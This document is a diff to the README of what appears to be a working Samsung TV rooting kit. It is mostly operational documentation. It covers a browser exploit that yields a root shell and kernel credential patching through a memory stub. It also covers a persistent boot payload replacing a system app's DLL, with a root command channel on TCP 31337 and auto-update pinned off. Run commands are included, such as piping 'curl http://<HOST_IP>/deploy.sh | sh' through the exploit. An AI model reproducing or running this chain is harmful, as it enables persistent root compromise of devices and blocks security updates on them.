@@ -35,7 +35,7 @@ channel on TCP 31337 (line protocol, replies end with `__END__`).
 
 | | |
 |---|---|
-| Payload | v13, 21,504 B, md5 `176914345bcc81ca8c87de712b4a044f` (`server/payload.dll`, source `payload/`; host-independent) |
+| Payload | v14, 23,040 B, md5 `5b798012ae35c9c567fa7a5ea91d6683` (`server/payload.dll`, source `payload/`; host-independent) |
 | Boot-to-root | ~40 s, measured 38–47 s across boots, with no PC and no browser |
 | Root identity | `uid=0`, `CapEff=0x3fffffffff`, running under the app's own SMACK label |
 | Boot hook | a `boot_sequence` row in `/opt/dbspace/user/5001/.appsvc.db` |
@@ -55,12 +55,31 @@ flow. The sequence of changes that got here is in `CHANGELOG.md`.
 browser on the exploit page hands back a root shell on `127.0.0.1:9999`; run
 `server/recover.sh` from that shell to reinstall the payload.
 
-Payload lineage (v5 → v13, and what each version fixed) is in `CHANGELOG.md`; the label
+Payload lineage (v5 → v14, and what each version fixed) is in `CHANGELOG.md`; the label
 regression that broke boot persistence is `docs/BOOT-REGRESSION-SMACK.md`.
+
+### Channel hardening (v14)
+
+The app must still be able to prove root "with no PC", so nothing on the boot path
+may block on the network:
+
+- **Beacons have a 500 ms connect timeout.** A stale `rootchan.host` (PC off, or
+  the address moved to another subnet) used to cost TCP SYN retries inside the
+  ~40 s budget. The local `share/root_boot.txt` marker is the durable record.
+- **`/dev/video40` is closed in every fork child** before it sleeps, and closed
+  before the fast-exit `Environment.Exit`. Without that, each landmark child kept
+  the single RDWR opener for 120 s and the next AUL launch sat in the `open()`
+  retry — a slow-boot cause that looked like a failed round.
+- **31337 bounds every client.** 30 s read/write timeout, 4 KB per command line,
+  8 KB pending without a newline, then the client is dropped. One silent
+  connection used to own the single-threaded accept loop until the app restarted.
+- **The allowlist fails closed.** `share/rootchan.allow` must exist and list the
+  peer; `deploy.sh` writes it *before* the DLL. A hand-copied payload therefore
+  needs that file too — create it with the PC's address or the channel stays shut.
 ### Auto-update is pinned off
 
 The TV would happily replace the app the payload lives in. The payload therefore
-re-asserts the menu setting at every boot (v13) and logs the readback
+re-asserts the menu setting at every boot (v13, unchanged in v14) and logs the readback
 (`DSHROOT autoupdate … = Int32: 0`):
 
 ```sh
@@ -152,9 +171,10 @@ TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
 | `tools/write_root.py` | write a file as root via op 8 (manual) |
 | `tools/physrpc.S` | ARM32 RPC stub source |
 | `tools/build_physrpc.py` | assembles the stub (keystone/capstone) |
-| `tools/taskwalk.py` | task-list chain diagnostic (`next`/`prev`) |
+| `tools/taskwalk.py` | task-list chain diagnostic (`next`/`prev`; not a validated pair) |
 | `tools/sim_rpc.py` | in-memory physmap RPC (no TV); `python tools/sim_rpc.py` self-test |
-| `payload/Program.cs` | boot payload source (v13) |
+| `tools/test_gateway.py` | gateway integration test (no TV): RSET, pairing, forwarding, BUSY, /save cap |
+| `payload/Program.cs` | boot payload source (v14) |
 | `payload/BootPayload.csproj` | net6.0 project, assembly `MultiControlService` |
 | `root.ps1` | one-command runner (server + root + deploy + verify) |
 | `uninstall.ps1` | one-command uninstall (restore stock + verify) |
@@ -225,7 +245,7 @@ shell - that corrupts the stream and wastes the page load.
 
 ### Repository hygiene (`.gitignore`, `.gitattributes`)
 
-**Committed** (47 files, ~400 KB on a fresh clone): `docs/`, `payload/*.cs` +
+**Committed** (~50 files, ~420 KB on a fresh clone): `docs/`, `payload/*.cs` +
 `*.csproj`, `server/{server.py,index.html,payload.dll,deploy.sh,uninstall.sh,diag.sh}`,
 `server/lib/`, `server/payloads/`, `tools/*.py|*.S|*.txt`, `root.ps1`,
 `uninstall.ps1`, `AGENTS.md`, `README.md`, `NOTICE.md`.
@@ -238,9 +258,9 @@ shell - that corrupts the stream and wastes the page load.
 
 `server/payload.dll` is committed **deliberately** — it is the artifact the TV
 fetches during deploy, and it is byte-identical to the build output
-`payload/out/MultiControlService.dll` (md5 `17691434…`), so the repo runs
+`payload/out/MultiControlService.dll` (md5 `5b798012…`, v14), so the repo runs
 without a .NET SDK. Rebuild with `dotnet build payload/BootPayload.csproj -c
-Release`, then update the `WANT=`/size gate in `server/deploy.sh`.
+Release`, then update the `WANT=`/`SIZE_WANT=` gate in `server/deploy.sh`.
 
 `.gitattributes` pins `*.sh`/`*.py` to **LF**: the TV's busybox `sh` treats a CR
 as part of the token (`#!/bin/sh^M: not found`), so a Windows checkout must not
@@ -281,22 +301,23 @@ python run_root.py "id" 6               # uid=0(root)
 
 # 4. deploy the boot payload
 python run_root.py "curl -s http://<HOST_IP>/deploy.sh | sh" 45
-#    expect: UID=0, SIZE=21504, MD5=17691434..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
+#    expect: UID=0, SIZE=23040, MD5=5b7980..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
+#    (deploy.sh now exits 1 on a label/boot-row/AUL failure instead of warning)
 
 # 5. reboot the TV (exit the browser first so it does not restore the page)
 
 # 6. permanent root
-python root_shell.py "id"               # uid=0(root)
-python root_shell.py "cat /proc/self/status | grep -E '^Uid|^CapEff'"
+python root_shell.py "id" <TV_IP>        # uid=0(root)
+python root_shell.py "cat /proc/self/status | grep -E '^Uid|^CapEff'" <TV_IP>
 ```
 
 `tools/auto_root.py` automates steps 2 and 4: start it, then load the page once.
 
 ## 7. Verification checklist
 
-- [ ] `root_shell.py "id"` returns `uid=0(root)`.
-- [ ] `root_shell.py "cat /proc/self/status | grep CapEff"` → `0000003fffffffff`.
-- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <tv-ip>` → `17691434…`.
+- [ ] `root_shell.py "id" <TV_IP>` returns `uid=0(root)`.
+- [ ] `root_shell.py "cat /proc/self/status | grep CapEff" <TV_IP>` → `0000003fffffffff`.
+- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `5b7980…`.
 - [ ] Cold boot with the browser closed → channel is back within ~60–90 s.
 - [ ] `kill -9 <app pid>` → channel back in ~12 s, still uid 0.
 
@@ -314,8 +335,10 @@ python root_shell.py "cat /proc/self/status | grep -E '^Uid|^CapEff'"
    bound kernel pointers at `0xE0000000`.
 6. **Post-fork managed code.** Use a pre-pinned buffer + raw
    `syscall(172,15,…)` in the child; a CLR allocation can deadlock.
-7. **Short commands.** Op 7 commands over ~100 chars can kill the stub; use
-   `curl …/deploy.sh | sh`.
+7. **Short commands.** The stub's `cmdbuf` is 512 B and `run_root.py` /
+   `auto_root.py` now refuse commands over 509 B (`write_root.py`: 255 B path,
+   4 KB chunk); use `curl …/deploy.sh | sh`. Commands over ~100 chars were
+   observed killing a stub even under the limit.
 8. **Do not fork repeatedly on one stub**; zombies poison the task walk.
 9. **Do not touch `/mnt/systemrw`** (OTA/update data) and do not poke
    `/dev/tztv_tcon` (TCON flash = brick risk).
@@ -338,8 +361,11 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
 
 - `Kptr(v) => v >= 0xC0000000` (accept the full 32-bit direct map).
 - Child tag via `GCHandle`-pinned bytes + `syscall(172, 15, ptr, 0,0,0,0)`.
-- `Thread.Sleep(600)` in the parent after `fork()`.
+- **Close `_fd` in the child with `syscall(6, _fd, …)`** before it sleeps, and
+  keep the child free of CLR allocations.
+- `Thread.Sleep(700)` in the parent after `fork()`.
 - Patch the **parent** task's cred (`real_parent`), not the child's.
+- Validate the cred (`SaneCred`: usage, ids, physical range) before writing.
 - Close `_fd` after rooting, before `RootChannel()`.
 - Keep the channel line protocol and the `__END__` terminator.
 
@@ -382,7 +408,9 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
   pid-hash and IDR locators are both blocked on this kernel (no kallsyms, and
   `init_pid_ns` has no `idr` field) — the cred-content scan above made them
   unnecessary. Full reasoning: `docs/SCRIPT-REVIEW.md`.
-- Automate re-embedding the shellcode in `browser_payload.js` after a rebuild.
+- Automate re-embedding the shellcode in `browser_payload.js` after a rebuild
+  (`tools/build_physrpc.py --check-embedded` now catches source/blob drift, and
+  `physrpc.S` matches the shipped blob's `/dev/video30`).
 - Repoint the remote's app buttons by patching `com.samsung.tv.hotkey-service`
   (see `docs/REMOTE.md`): capture the `XF86AppN` key, decompile the service IL,
   change the appid, deploy with a backup, test one button.
